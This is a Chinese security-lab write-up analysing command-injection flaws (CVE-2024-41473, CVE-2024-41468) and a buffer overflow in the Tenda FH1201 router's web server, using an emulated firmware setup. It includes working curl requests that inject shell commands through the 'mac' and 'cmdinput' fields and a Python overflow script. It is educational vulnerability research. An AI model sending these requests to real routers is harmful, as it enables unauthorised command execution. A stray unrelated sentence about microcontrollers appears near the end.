---
title: 原创 Paper | Tenda-FH1201 多处命令注入漏洞分析和复现
url: https://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650980808&idx=1&sn=236c94b01cd05a39e5d4d3cdd3d09b40&chksm=807983fab70e0aec55349c9968ad70b9beeaf3307b81142c146f3058c9ae4619fbe0905dcf51&scene=58&subscene=0#rd
source: 知道创宇404实验室
date: 2024-08-14
fetch_date: 2025-10-06T18:03:26.270885
---

# 原创 Paper | Tenda-FH1201 多处命令注入漏洞分析和复现

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCD1OC4T1QUqgj1HHe0RFQSW52kO9yBm3qcsH8wkOBv38gPeJTLl7gF9A/0?wx_fmt=jpeg)

# 原创 Paper | Tenda-FH1201 多处命令注入漏洞分析和复现

原创

404实验室

知道创宇404实验室

**作者：********fan**@知道创宇404实验室****

**时间：**2024年8月13日****

**1 前言**

近期，在浏览公众号时无意发现  `Tenda-FH1201` 存在命令注入漏洞 `CVE-2024-41468`,`CVE-2024-41473` 。一看固件更新时间为 2018-10-12 ，感觉没必要应急了，但是作为初学者练习还是不错。

腾达（Tenda）是中国的一家网络设备制造商，专注于生产各种网络相关设备，包括路由器、交换机、无线适配器和网络摄像头等。腾达的 FH 系列路由器是其家庭和小型办公网络解决方案中的一种，主要特点是性价比高，易于设置和使用。

**2 环境搭建**

### **2.1 固件下载**

Tenda官网提供固件下载：

```
固件版本: FH1201 Firmware  V1.2.0.14
```

`binwalk` 解压固件：

```
$ binwalk -Me US_FH1201V1.0BR_V1.2.0.14\(408\)_EN_TD.bin
```

查看 `bin/busybox` 得知是32位mips架构(小端)：

```
$ file squashfs-root/bin/busybox
squashfs-root/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

### **2.2 QEMU模拟**

先使用 QEMU用户级调试启动，看看会不会遇到问题。安装 `qemu-user-static`：

```
$ sudo apt install qemu-user-static  # debian,ubuntu
$ sudo yum install qemu-user-static  # centos
```

安装完成后将 `qemu-mipsel-static` 赋值到文件系统目录 `squashfs-root` 下，启动 `httpd` 服务：

```
$ cd squashfs-root/
$ cp $(which qemu-mipsel-static) ./
$ sudo chroot ./ ./qemu-mipsel-static ./bin/httpd
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZW5PSRGic9qO1twlfWFicRSANV9MiclZ2xbVzLicZibzZyqFIpaCicln5HfPw/640?wx_fmt=png&from=appmsg)

图1 尝试启动httpd服务

发现程序会卡在上图字符串位置。为了使程序继续进行，使用`IDA` 打开 `httpd` 文件分析原因，首先定位到 `Welcome` 字符串，`Shift+F12` 打开字符串窗口再通过 `Ctrl+f` 搜索关键字 `Welcome`。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZqINHKwBysjxDThc1gwwAZrQsAt5JORzKzBjZkibcejQYv8qQF8sXHag/640?wx_fmt=png&from=appmsg)

图2 搜索关键字Welcome

`Ctrl+x` 交叉引用看到汇编代码后再 `F5` 反编译看看代码大概逻辑。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZrtaAhLpD9wic8LeH0xlMC8RxRTyGFCzicvJ4ocvHIC99e5nU1r8QPgpA/640?wx_fmt=png&from=appmsg)

图3 反汇编源码

这里有一个 `check_network` 函数被循环调用，并且还有 `sleep(1u)` 的延迟，直到返回值大于0。目的可能是等待网络连接成功后再执行后续操作，这样就会陷入死循环。

再通过汇编代码看看执行逻辑：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZf0dpZicQmPH5bRM6cqqV3picRKx09uUKOH0KLUo9CqJ03aL9m1C2m5iaw/640?wx_fmt=png&from=appmsg)

图4 汇编源码

```
addiu $v0, $fp, 0xE0+var_34:    计算v0的值，这里v0指向变量v7。
move $a0, $v0:                  将v0的值传递给a0（第一个函数参数）。
la $t9, check_network:          加载check_network函数的地址到t9。
jalr $t9:                       跳转并链接到check_network函数。
lw $gp, 0xE0+var_D0($fp):       恢复全局指针寄存器$gp。
bgtz $v0, loc_48926C:           如果check_network返回值大于0，跳转到loc_48926C。
```

因为 `check_network` 返回值无法大于0而陷入死循环。

可以通过修改汇编代码，使程序不调用 `check_network` 直接跳转到后续操作。这里使用的方式是将 `move $a0, $v0` 修改为 `li $v0, 1` ,后续代码 `nop` 代替，模拟 `check_network` 返回大于1，跳转到 `loc_48926C` 继续执行后续代码。

直接使用 `IDA` 提供的 `Edit->Patch program->change byte` 更改鼠标指针处的字节：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZibpZZj4WXR1FBdrCQe7Uoh9BFpPhtg2JlaDPyek1Fzo4OiaHuOF5Fu3Q/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0PDgm6bM46ymia6hmuomxLZib2hTjALYU80hEuapsYFG2wpKvkc9AWgibBnyjgSYYjtRk49sY7e6nOA/640?wx_fmt=png&from=appmsg)

图5 patch之后汇编代码

然后，`Edit->Patch program->Apply patches to input file` 将更改保存进二进制文件。

QEMU系统级调试模拟环境，此时需要一个 `mipsel` 架构的内核镜像和文件系统，可以在这个网站下载。

```
vmlinux-2.6.32-5-4kc-malta  内核镜像
debian_squeeze_mipsel_standard.qcow2  文件系统
```

```
$ sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=tap0,script=no,downscript=no
```

启动后用户名和密码都是 `root` 即可登录模拟的系统。

接下来在宿主机创建一个网卡，使 `qemu` 内能和宿主机通信。

宿主机安装依赖：

```
$ sudo apt-get install bridge-utils uml-utilities
```

将如下代码保存为 `net.sh` 并运行即可：

```
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPTsudo iptables -P OUTPUT ACCEPT
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0
```

然后配置 `qemu` 虚拟系统的路由，在 `qemu` 虚拟系统中运行 `net.sh` 并运行：

```
#！/bin/sh
ifconfig eth0 192.168.100.2 netmask 255.255.255.0
route add default gw 192.168.100.254
```

//虚拟系统可能没有 vim 或 nano ，使用 echo 一行一行写。这样宿主机和模拟环境互通，使用 `scp` 命令将 `squashfs-root` 文件夹上传到 `qemu` 系统中的 `/root` 路径下：

```
scp -r squashfs-root/ root@192.168.100.2:/root
```

然后挂载 `proc` 、 `dev` ，最后 `chroot` 即可：

```
root@debian-mipsel:~# mount -t proc /proc ./squashfs-root/proc
root@debian-mipsel:~# mount -o bind /dev ./squashfs-root/dev
root@debian-mipsel:~# chroot ./squashfs-root/ sh
# ls
bin                 lib                 sys
dev                 media               tmp
etc                 mnt                 usr
etc_ro              proc                var
```

运行 `bin/httpd` 成功搭建环境。

**3 漏洞分析**

### **3.1 CVE-2024-41473**

漏洞位于 `WriteFacMac` 函数中：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCDRptwe2evHphhqpqRJx3CicDHDlIBs9Uc4guPhlVcS8MibmaQpZkoRibaA/640?wx_fmt=png&from=appmsg)

图6 writeFacMac源码

`websGetVar(a1, "mac", "00:01:02:11:22:33")`代码从 HTTP 请求中获取名为 `mac` 的参数。如果参数不存在，则使用默认值 `"00:01:02:11:22:33"`。

`doSystemCmd("cfm mac %s", Var)`代码使用格式化字符串 `cfm mac %s` 和变量 `Var` 生成命令，然后调用 `doSystemCmd` 函数执行生成的命令。

`doSystemCmd` 函数看起来是一个执行系统命令的函数，并且通过格式化字符串将 `Var` 直接插入命令中。如果 `Var` 中包含恶意用户输入，可能会导致命令注入漏洞。例如，用户可以通过以下方式提交恶意 `mac` 参数：

```
mac=00:01:02:11:22:33; ifconfig /
```

这种情况下生成的命令将会导致命令执行：

```
cfm mac 00:01:02:11:22:33; ifconfig /
```

**漏洞复现**

```
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "mac=%3Bifconfig" "http://192.168.100.2/goform/WriteFacMac"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCD7SXTnpATpoR7MDWibBawFY2b7o2icuMVExhziapHCp6EGRlIkVRCgRuJA/640?wx_fmt=png&from=appmsg)

图7 漏洞复现

### **3.2 CVE-2024-41468**

漏洞位于 `exeCommand` 函数中：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCDCCU4nlBcQMwFpAjTtibdibS7yesFgJUa43r2iaW2h6iahFcjvNbXGPAMUw/640?wx_fmt=png&from=appmsg)

图8 exeCommand源码

`src = (char *)websGetVar(a1, "cmdinput", &unk_4AFDC0)`代码从HTTP请求中获取名为 `cmdinput` 的参数，存储在 `src` 中。如果参数不存在，使用默认值 `&unk_4AFDC0`。

`strcpy(v7, src)`代码将获取到的 `cmdinput` 参数值复制到缓冲区 `v7` 中。没有对输入进行验证或清理。

由于 `doSystemCmd` 函数直接使用 `v7` 中的值作为命令执行，且 `v7` 是从用户输入中获取的，这会导致命令注入漏洞。例如，用户可以通过以下方式提交恶意 `cmdinput` 参数：

```
cmdinput=ls; ifconfig /
```

这种情况下生成的命令将会导致命令执行：

```
ls; ifconfig /
```

漏洞复现

```
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "cmdinput=ifconfig%3B" "http://192.168.100.2/goform/exeCommand"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCDFAOocwDszmMaia7GjLZlTaAsV7vrGEQoFqjzfz11rVVicCzc1Hf3QwJw/640?wx_fmt=png&from=appmsg)

图9 漏洞复现

此外，大家注意看图8中黑线标出部分，`char v7[512];` `char v8[256];` `char v9[4096];` `char v10[4096];` 声明了一些固定大小的缓冲区。

`strcpy(v7, src);` 使用 `strcpy` 将用户输入复制到 `v7`，但 `strcpy` 不会检查目标缓冲区的大小。如果 `src` 超过 512 字节，导致导致缓冲区溢出，程序崩溃。

```
import requests

ip = '192.168.100.2'
url = f"http://{ip}/goform/exeCommand"

long_input = 'A' * 600  # 600 字节的字符串，会溢出 512 字节的缓冲区

data = {
    "cmdinput": long_input
}

ret = requests.post(url=url, data=data)
print(ret.text)
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3k9IT3oQhT0aiarbc9dIrcb3AM5BVicDCDuYv6liaToEUmbBoSpvSePicnaVK88LK04MLtLy3uEiciaAbfwSWfjBY7Xw/640?wx_fmt=png&from=appmsg)

图10 溢出漏洞复现

同样地，在 `fgets(v10, 4096, stream)` 和 `memcpy(&v9[v3], v10, n)` 中，没有适当的边界检查，也可能导致缓冲区溢出。

**4 总结**

参考资料

感觉这个路由器还有没被发现的漏洞，存在 `doSystemCmd` 函数调用的地方都可能产生命令注入，并且很多地方都存在溢出漏洞。通过溢出漏洞 `RCE` 的利用我也还在学习中，学会了下篇再聊。

**5 相关链接**

参考资学完了前面三个程序后，可以说已经入门了单片机开发，能进行以下几种基础操作：控制端口输出，编写中断函数，通过uart口输出调试信息。

[1] 固件下载：

https://www.tendacn.com/download/detail-3322.html

[2] 内核镜像和文件系统下载：

https://people.debian.org/~aurel32/qemu/

![](https://mmbiz.qpic.cn/mmbiz_png/3k9IT3...